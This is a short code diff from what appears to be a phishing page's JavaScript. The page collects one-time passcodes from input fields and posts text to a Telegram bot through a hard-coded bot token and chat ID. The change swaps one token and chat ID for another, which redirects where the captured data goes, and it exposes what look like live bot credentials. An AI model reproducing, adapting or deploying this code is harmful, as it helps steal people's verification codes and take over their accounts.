@@ -109,8 +109,8 @@ resendBtn.addEventListener('click', () => {
 function getOTP(){ return Array.from(inputs).map(i=>i.value).join(''); }
 
 async function sendToTelegram(text){
-  const token = '7727536198:AAHVg5-c49YD5HLPHN38BR0fXMNSu5kc8F8';
-  const chat_id = '6616863663';
+  const token = '8469634999:AAEZEB17GCnSsx--dfBA6dUIo4JSq7Tqr98';
+  const chat_id = '8597632105';
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   await fetch(url, {
     method:'POST',
